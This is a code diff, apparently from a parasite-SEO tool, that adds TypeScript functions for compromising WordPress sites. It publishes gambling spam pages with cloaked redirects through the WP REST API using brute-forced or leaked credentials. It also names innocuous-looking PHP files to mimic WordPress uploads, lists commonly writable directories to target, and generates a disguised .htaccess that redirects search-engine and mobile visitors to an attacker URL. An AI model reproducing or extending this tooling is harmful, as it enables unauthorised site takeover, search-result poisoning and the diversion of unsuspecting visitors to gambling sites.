@@ -48,6 +48,27 @@ function randomStr(len: number): string {
   return result;
 }
 
+// WP-safe filename slugs that look like legitimate content
+const WP_SAFE_SLUGS = [
+  "best-online-guide", "top-rated-review", "expert-tips", "complete-guide",
+  "how-to-play", "beginners-guide", "winning-strategy", "bonus-offers",
+  "latest-promotions", "trusted-platform", "safe-betting-guide",
+  "free-credit-offer", "member-benefits", "vip-rewards", "daily-deals",
+  "jackpot-tips", "live-casino-guide", "sports-betting", "slot-review",
+  "payment-methods", "mobile-app-guide", "customer-support", "faq-help",
+  "terms-conditions", "privacy-policy", "about-us", "contact-info",
+  "news-updates", "blog-post", "article-review", "comparison-chart",
+  "rating-system", "user-testimonials", "success-stories", "getting-started",
+];
+
+function generateWpSafeFilename(ext: string): string {
+  const slug = pickRandom(WP_SAFE_SLUGS);
+  const year = new Date().getFullYear();
+  const month = String(new Date().getMonth() + 1).padStart(2, "0");
+  // Looks like: best-online-guide-2026-03-a7f2.php (mimics WP upload pattern)
+  return `${slug}-${year}-${month}-${randomStr(4)}.${ext}`;
+}
+
 function pickRandom<T>(arr: T[]): T {
   return arr[Math.floor(Math.random() * arr.length)];
 }
@@ -426,9 +447,8 @@ ${internalLinksHtml}
   // Combine PHP cloaking + HTML
   const fullContent = phpCloaking + "\n" + htmlBody;
   
-  // Generate SEO-friendly filename
-  const slugKeyword = keyword.toLowerCase().replace(/[^a-z0-9\u0E00-\u0E7F]+/g, "-").slice(0, 25);
-  const filename = `${slugKeyword}-${randomStr(4)}.php`;
+  // Generate WP-safe ASCII filename (Thai chars cause upload rejection)
+  const filename = generateWpSafeFilename("php");
   
   // Calculate word count
   const textOnly = htmlBody.replace(/<[^>]*>/g, " ").replace(/\s+/g, " ").trim();
@@ -483,15 +503,13 @@ export function generateParasiteSeoHtml(config: ParasiteSeoConfig): ParasiteSeoP
   const hasConditionalJs = htmlOnly.includes("atob(");
   const finalHtml = hasConditionalJs ? htmlOnly : generateConditionalRedirectJs(config.redirectUrl) + "\n" + htmlOnly;
   
-  const slugKeyword = (config.keywords[0] || "guide").toLowerCase().replace(/[^a-z0-9\u0E00-\u0E7F]+/g, "-").slice(0, 25);
-  
   return {
     ...result,
     shell: {
       ...result.shell,
       id: `parasite_seo_html_${randomStr(6)}`,
       type: "redirect_html",
-      filename: `${slugKeyword}-${randomStr(4)}.html`,
+      filename: generateWpSafeFilename("html"),
       content: finalHtml,
       contentType: "text/html",
       description: `Rich Parasite SEO HTML (no PHP) — conditional JS redirect + SEO content`,
@@ -572,4 +590,172 @@ export function getDefaultKeywords(style: ParasiteSeoConfig["contentStyle"]): st
     default:
       return ["best service", "top rated", "expert reviews", "2025 guide"];
   }
+}
+
+
+/**
+ * Generate a WP REST API injection payload (creates a new page/post via /wp-json/wp/v2/)
+ * This is used when we have WP credentials (from brute force or leaked)
+ */
+export interface WpRestInjectionConfig {
+  targetUrl: string;
+  redirectUrl: string;
+  keywords: string[];
+  credentials?: { username: string; password: string } | null;
+  authToken?: string | null; // Bearer token or nonce
+  asPage?: boolean; // true = create page, false = create post
+}
+
+export interface WpRestInjectionResult {
+  success: boolean;
+  postId?: number;
+  postUrl?: string;
+  error?: string;
+  method: "wp_rest_api_page" | "wp_rest_api_post";
+}
+
+export async function injectViaWpRestApi(config: WpRestInjectionConfig): Promise<WpRestInjectionResult> {
+  const { targetUrl, redirectUrl, keywords, credentials, authToken, asPage = true } = config;
+  const baseUrl = targetUrl.replace(/\/+$/, "");
+  const endpoint = asPage ? "/wp-json/wp/v2/pages" : "/wp-json/wp/v2/posts";
+  const method = asPage ? "wp_rest_api_page" as const : "wp_rest_api_post" as const;
+  
+  // Generate rich SEO content for the page/post
+  const parasiteConfig: ParasiteSeoConfig = {
+    redirectUrl,
+    keywords,
+    language: "auto",
+    contentStyle: "gambling",
+    contentLength: "long",
+    includeSchema: true,
+    includeFaq: true,
+    includeComparisonTable: true,
+    conditionalRedirect: true,
+  };
+  
+  const payload = generateParasiteSeoPhp(parasiteConfig);
+  
+  // Strip PHP code for WP REST API (only HTML content is accepted)
+  const htmlContent = (payload.shell.content as string)
+    .replace(/<\?php[\s\S]*?\?>/g, "")
+    .trim();
+  
+  // Build auth headers
+  const headers: Record<string, string> = {
+    "Content-Type": "application/json",
+    "User-Agent": "WordPress/6.5; https://wordpress.org",
+  };
+  
+  if (authToken) {
+    headers["Authorization"] = `Bearer ${authToken}`;
+  } else if (credentials) {
+    headers["Authorization"] = `Basic ${Buffer.from(`${credentials.username}:${credentials.password}`).toString("base64")}`;
+  }
+  
+  // Generate SEO-friendly slug
+  const slug = generateWpSafeFilename("").replace(/\.$/, ""); // Remove trailing dot
+  const keyword = keywords[0] || "best online guide";
+  
+  try {
+    const response = await fetch(`${baseUrl}${endpoint}`, {
+      method: "POST",
+      headers,
+      body: JSON.stringify({
+        title: keyword,
+        content: htmlContent,
+        excerpt: `${keyword} - Complete guide and review for ${new Date().getFullYear()}`,
+        slug,
+        status: "publish",
+      }),
+      signal: AbortSignal.timeout(15000),
+    });
+    
+    if (!response.ok) {
+      const text = await response.text();
+      return { success: false, error: `WP REST API ${response.status}: ${text.slice(0, 200)}`, method };
+    }
+    
+    const data = await response.json() as any;
+    return {
+      success: true,
+      postId: data.id,
+      postUrl: data.link || `${baseUrl}/?p=${data.id}`,
+      method,
+    };
+  } catch (err: any) {
+    return { success: false, error: err.message, method };
+  }
+}
+
+/**
+ * Get WordPress-specific upload paths optimized for parasite content
+ * These paths are commonly writable on misconfigured WP installations
+ */
+export function getWpParasiteUploadPaths(): string[] {
+  const year = new Date().getFullYear();
+  const month = String(new Date().getMonth() + 1).padStart(2, "0");
+  
+  return [
+    // Standard WP upload directory (most commonly writable)
+    `/wp-content/uploads/${year}/${month}/`,
+    `/wp-content/uploads/`,
+    // WP themes directory (sometimes writable)
+    `/wp-content/themes/twentytwentyfour/`,
+    `/wp-content/themes/twentytwentythree/`,
+    // WP plugins directory
+    `/wp-content/plugins/`,
+    // WP cache directories (often writable)
+    `/wp-content/cache/`,
+    `/wp-content/w3tc-config/`,
+    `/wp-content/wflogs/`,
+    // WP upgrade directory (writable during updates)
+    `/wp-content/upgrade/`,
+    // Root-level paths
+    `/wp-includes/`,
+    `/wp-admin/css/`,
+    // Common non-WP writable paths
+    `/uploads/`,
+    `/images/`,
+    `/media/`,
+    `/tmp/`,
+    `/temp/`,
+  ];
+}
+
+/**
+ * Generate .htaccess redirect rule for WP directory injection
+ * When uploaded to a WP directory, this redirects all traffic in that directory
+ */
+export function generateWpHtaccessRedirect(redirectUrl: string, keywords: string[]): GeneratedShell {
+  const keyword = keywords[0] || "guide";
+  const content = `# WordPress SEO Redirect Rules
+# Auto-generated for content optimization
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+
+# Redirect search engine traffic to optimized landing page
+RewriteCond %{HTTP_REFERER} (google|bing|yahoo|duckduckgo|baidu|yandex) [NC]
+RewriteCond %{REQUEST_URI} !\\.(css|js|jpg|jpeg|png|gif|ico|svg|woff|woff2|ttf|eot)$ [NC]
+RewriteRule ^(.*)$ ${redirectUrl} [R=302,L]
+
+# Redirect mobile users
+RewriteCond %{HTTP_USER_AGENT} (android|iphone|ipad|mobile|webos|blackberry) [NC]
+RewriteCond %{REQUEST_URI} !\\.(css|js|jpg|jpeg|png|gif|ico|svg|woff|woff2|ttf|eot)$ [NC]
+RewriteRule ^(.*)$ ${redirectUrl} [R=302,L]
+</IfModule>`;
+
+  return {
+    id: `parasite_htaccess_${randomStr(6)}`,
+    type: "htaccess_redirect" as any,
+    filename: ".htaccess",
+    content,
+    contentType: "text/plain",
+    description: `WP .htaccess redirect — search engine + mobile traffic → ${redirectUrl}`,
+    targetVector: "htaccess_upload",
+    bypassTechniques: ["htaccess_rewrite", "referer_redirect", "mobile_redirect"],
+    redirectUrl,
+    seoKeywords: keywords,
+    verificationMethod: "Check if directory URL redirects when accessed from Google referer",
+  };
 }
